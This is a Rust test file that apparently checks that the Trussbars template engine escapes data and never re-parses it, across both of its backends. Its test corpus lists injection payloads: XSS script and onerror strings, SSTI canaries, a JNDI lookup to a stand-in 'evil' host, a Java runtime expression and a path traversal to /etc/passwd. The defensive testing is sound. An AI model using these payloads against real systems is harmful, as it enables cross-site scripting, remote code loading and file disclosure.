//! The **injection-law gate** (N2, docs/24) — the structural security claim, turned into a
//! reproducible CI test rather than a slogan.
//!
//! The law: *names are static, data is dynamic, the two never cross.* Trussbars sandboxes the
//! data **plane** — a data value can never reach a name/head position (so it can't name a helper,
//! re-enter the parser, or become code), and data is HTML-escaped by default; the **only** way a
//! data value reaches the output raw is an *explicit* `{{ x | safe }}` / a `Safe` value the trusted
//! template author wrote. This is the difference between Trussbars and an interpreter with
//! configurable autoescape (where the crossing is *possible* and SSTI is a CVE class).
//!
//! This gate proves it adversarially against **both** dynamic backends (interpreter + VM):
//!
//!  1. *No re-entrancy / no head-position crossing* — for a curated corpus of XSS / SSTI /
//!     template-injection / path payloads AND a deterministically *generated* fuzz over injection
//!     fragments, `{{ x }}` renders to **exactly** the engine's escaped form: a payload that looks
//!     like `{{boom}}` / `{{7*7}}` / `{% if %}` / `${jndi:…}` comes out as inert escaped text, never
//!     evaluated. (If the engine ever re-parsed it, the output would diverge from the escaped form.)
//!  2. *Escaping has teeth* — an active XSS substring (`<script`, `onerror=`, …) is **never** present
//!     unescaped in default output (an independent check, not just `== escape(x)`).
//!  3. *Data can't invoke a helper* — a **poison** helper set is registered; if a data value equal to
//!     a helper name ever reached head position, the helper would fire and fail the render. It never
//!     does.
//!  4. *The one raw path is explicit* — `{{ x | safe }}` (and only it) emits the payload raw; for any
//!     payload with metachars the default and the `| safe` outputs differ. This documents the escape
//!     hatch the headline claim must name honestly (docs/24, suggestion #7).
//!
//! Both backends must also agree byte-for-byte (the law holds identically in each).

use std::collections::BTreeMap;
use std::rc::Rc;

use trussbars_interp::{Helpers, Template, TruthMode, Value, write_escaped};
use trussbars_vm::Program;

fn s(t: &str) -> Value {
    Value::Str(Rc::from(t))
}

fn obj1(key: &str, v: Value) -> Value {
    let mut m = BTreeMap::new();
    m.insert(key.to_string(), v);
    Value::Object(Rc::new(m))
}

/// The engine's own escape of `payload` — the reference for "what escaped output must be".
fn esc(payload: &str) -> String {
    let mut out = String::new();
    write_escaped(&s(payload), &mut out);
    out
}

/// A poison helper set: every one of these names, if ever invoked *because a data value reached a
/// head position*, fails the render. Data must never trigger any of them.
fn poison_helpers() -> Rc<Helpers> {
    let mut h = Helpers::new();
    for name in [
        "boom", "loud", "lookup", "add", "pwn", "evil", "system", "exec", "x", "y",
    ] {
        h.register(name, |_args: &[Value]| {
            Err::<Value, String>("INJECTION: a data value reached a head position".to_string())
        });
    }
    Rc::new(h)
}

/// Render `src` against `data` through **both** dynamic backends with the poison helpers; assert
/// the two agree and return the (shared) output. Panics on any render error — the poison helper
/// firing, or a real failure — so the test fails loudly if the law leaks.
fn render_both(src: &str, data: &Value) -> String {
    let h = poison_helpers();
    let interp = Template::parse(src)
        .unwrap()
        .render_with(data, &h)
        .unwrap_or_else(|e| panic!("interp {src:?}: {e}"));
    let vm = Program::compile(src)
        .unwrap()
        .render_with(data, TruthMode::NonEmpty, &h)
        .unwrap_or_else(|e| panic!("vm {src:?}: {e}"));
    assert_eq!(interp, vm, "interp != vm for {src:?}");
    interp
}

/// The named injection classes — XSS, SSTI canaries, template re-entrancy, path/proto, encoding.
const CORPUS: &[&str] = &[
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\"><svg onload=alert(1)>",
    "'><script>alert(1)</script>",
    "{{boom}}",
    "{{ boom x }}",
    "{{7*7}}",                  // SSTI canary — must NOT become 49
    "{% if x %}PWN{% endif %}", // statement re-entrancy
    "{{{raw}}}",
    "{% raw %}leak{% endraw %}",
    "${jndi:ldap://evil/a}",
    "#{T(java.lang.Runtime)}",
    "&amp;&lt;already-escaped&gt;",
    "../../../etc/passwd",
    "__proto__",
    "constructor",
    "boom",
    "a\u{0000}b",
    "héllo 😀 ünïcode",
    "",
];

/// Deterministically *generated* adversarial data: every single, pair, and embedded-triple of the
/// injection fragments below (~3.6k payloads) — a reproducible fuzz with no `proptest` flakiness.
fn generated() -> Vec<String> {
    let frags = [
        "<script>",
        "</script>",
        "{{",
        "}}",
        "{%",
        "%}",
        "\"",
        "'",
        "&",
        "<",
        ">",
        "onerror=",
        "${",
        "boom",
        "../",
    ];
    let mut out = Vec::new();
    for &a in &frags {
        out.push(a.to_string());
        for &b in &frags {
            out.push(format!("{a}{b}"));
            for &c in &frags {
                out.push(format!("{a}x{b}y{c}"));
            }
        }
    }
    out
}

#[test]
fn data_is_escaped_by_default_and_never_re_entrant() {
    // Tag-openers are the teeth: each needs a literal `<`, which default escaping turns into
    // `&lt;`, so the tag can never form. (A bare `onerror=` without a `<` is inert text.)
    let active = ["<script", "<svg", "<img", "</script", "<a", "<iframe"];
    let all: Vec<String> = CORPUS
        .iter()
        .map(|s| (*s).to_string())
        .chain(generated())
        .collect();

    for p in &all {
        let d = obj1("x", s(p));

        // (1) default {{x}} is EXACTLY the escaped payload — no re-parse, no head crossing, escaped.
        let out = render_both("{{x}}", &d);
        assert_eq!(
            out,
            esc(p),
            "default output diverged from escaped form for {p:?}"
        );

        // (2) escaping has teeth: no active XSS substring survives unescaped.
        for a in active {
            if p.contains(a) {
                assert!(
                    !out.contains(a),
                    "active substring {a:?} leaked raw in default output for {p:?}: {out:?}"
                );
            }
        }

        // the law holds in every output context — a loop body and an HTML attribute too.
        assert_eq!(
            render_both(
                "{% for i in xs %}{{i}}{% endfor %}",
                &obj1("xs", Value::Array(Rc::from(vec![s(p)])))
            ),
            esc(p),
            "loop-context output diverged for {p:?}"
        );
        let attr = render_both(r#"<a href="{{x}}">l</a>"#, &d);
        assert_eq!(attr, format!(r#"<a href="{}">l</a>"#, esc(p)));
        // a quote in the payload can never break out of the attribute.
        if p.contains('"') {
            assert!(
                !attr.contains(r#"="""#),
                "attribute break-out for {p:?}: {attr:?}"
            );
        }
    }
}

#[test]
fn the_only_raw_path_is_an_explicit_safe() {
    for p in CORPUS {
        let d = obj1("x", s(p));
        // `{{ x | safe }}` is the explicit, author-written opt-OUT — the one way data reaches the
        // output raw. (The escape hatch the N2 claim must name honestly, docs/24.)
        assert_eq!(
            render_both("{{ x | safe }}", &d),
            (*p).to_string(),
            "safe should be raw for {p:?}"
        );
        // and it is genuinely different from the safe default whenever the payload has metachars.
        if &esc(p) != p {
            assert_ne!(
                render_both("{{x}}", &d),
                render_both("{{ x | safe }}", &d),
                "default and |safe should differ for {p:?}"
            );
        }
    }
}

#[test]
fn data_equal_to_a_helper_name_never_invokes_it() {
    // Each name is a registered poison helper; as DATA it must stay inert text, never fire.
    for name in [
        "boom", "loud", "lookup", "add", "pwn", "evil", "system", "exec",
    ] {
        let d = obj1("x", s(name));
        assert_eq!(render_both("{{x}}", &d), name.to_string());
        // even when the data string is shaped like a call, it is still just text.
        let call = format!("{name} 1 2");
        assert_eq!(render_both("{{x}}", &obj1("x", s(&call))), esc(&call));
    }
}
